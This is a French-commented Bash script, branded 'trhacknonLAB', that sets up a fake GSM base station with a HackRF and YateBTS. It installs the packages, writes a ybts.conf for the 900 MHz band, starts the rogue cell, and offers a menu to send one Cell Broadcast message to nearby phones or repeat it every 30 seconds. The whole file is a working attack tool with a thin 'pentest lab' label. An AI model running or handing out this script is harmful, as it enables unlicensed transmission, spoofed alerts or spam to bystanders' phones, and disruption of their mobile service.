#!/bin/bash

# Script complet avec MENU pour créer une fausse BTS GSM avec HackRF
# Version avancée - trhacknonLAB edition

# Couleurs
GREEN="\e[32m"
RED="\e[31m"
YELLOW="\e[33m"
RESET="\e[0m"

banner() {
    echo -e "${GREEN}"
    echo "  _______        _        _______  _______ _________ _______ "
    echo " (  ____ \      ( (    /|(  ___  )(  ____ )\__   __/(  ____ \\"
    echo " | (    \/      |  \  ( || (   ) || (    )|   ) (   | (    \/"
    echo " | (_____       |   \ | || (___) || (____)|   | |   | (__    "
    echo " (_____  )      | (\ \) ||  ___  ||     __)  | |   |  __)   "
    echo "       ) |      | | \   || (   ) || (\ (     | |   | (      "
    echo " /\____) | _    | )  \  || )   ( || ) \ \__  | |   | (____/\\"
    echo " \_______)(_)   |/    )_)|/     \||/   \__/  )_(   (_______/"
    echo " "
    echo " Fake GSM Cell Menu - trhacknon edition"
    echo -e "${RESET}"
}

check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}[!] Ce script doit être exécuté en root.${RESET}"
        exit 1
    fi
}

install_requirements() {
    echo -e "${GREEN}[+] Installation des paquets requis...${RESET}"
    apt update
    apt install -y yate yate-bts yate-dev hackrf telnet
}

check_hackrf() {
    echo -e "${GREEN}[+] Vérification de HackRF...${RESET}"
    hackrf_info > /dev/null 2>&1
    if [ $? -ne 0 ]; then
        echo -e "${RED}[!] HackRF non détecté. Branche-le et réessaye.${RESET}"
        exit 1
    fi
    echo -e "${GREEN}[+] HackRF détecté.${RESET}"
}

configure_ybts() {
    echo -e "${GREEN}[+] Configuration de YateBTS...${RESET}"
    YBTS_CONF="/etc/yate/ybts.conf"

    cat > "$YBTS_CONF" << EOF
[ybts]
Radio.Band=900
Radio.C0=45
Radio.Power=20
Identity.MCC=208
Identity.MNC=99
Identity.ShortName=trhacknonLAB
Identity.LongName=HACKRF Pentest Lab
EOF

    echo -e "${GREEN}[+] Configuration terminée.${RESET}"
}

start_bts() {
    echo -e "${GREEN}[+] Lancement de la fausse BTS...${RESET}"
    pkill yate > /dev/null 2>&1
    sleep 1
    yate -s -C /etc/yate/ybts.conf &
    sleep 5
    echo -e "${GREEN}[+] BTS active.${RESET}"
}

send_cell_broadcast() {
    local message="$1"
    (
    sleep 2
    echo "!broadcast text 50 \"$message\""
    sleep 2
    ) | telnet localhost 5038 > /dev/null 2>&1
    echo -e "${GREEN}[+] Message envoyé : $message${RESET}"
}

spam_cell_broadcast() {
    local message="$1"
    local interval="$2"
    echo -e "${YELLOW}[+] Démarrage du spam Cell Broadcast toutes les $interval secondes...${RESET}"
    while true; do
        send_cell_broadcast "$message"
        sleep "$interval"
    done
}

stop_bts() {
    echo -e "${RED}[!] Arrêt de la BTS...${RESET}"
    pkill yate > /dev/null 2>&1
    sleep 1
    echo -e "${RED}[+] BTS arrêtée.${RESET}"
}

menu() {
    while true; do
        echo ""
        echo -e "${YELLOW}===== MENU =====${RESET}"
        echo "1) Envoyer un Cell Broadcast"
        echo "2) Spam Cell Broadcast (toutes les 30 secondes)"
        echo "3) Redémarrer la BTS"
        echo "4) Arrêter la BTS et quitter"
        echo ""

        read -p "$(echo -e $GREEN'Choix > '$RESET)" choice

        case $choice in
            1)
                read -p "$(echo -e $YELLOW'Entrez votre message à envoyer : '$RESET)" message
                send_cell_broadcast "$message"
                ;;
            2)
                read -p "$(echo -e $YELLOW'Entrez votre message à spammer : '$RESET)" message
                spam_cell_broadcast "$message" 30
                ;;
            3)
                stop_bts
                start_bts
                ;;
            4)
                stop_bts
                echo -e "${GREEN}[+] Merci d'avoir utilisé trhacknonLAB.${RESET}"
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Choix invalide.${RESET}"
                ;;
        esac
    done
}

# ========== Programme principal ==========

clear
banner
check_root
install_requirements
check_hackrf
configure_ybts
start_bts
menu
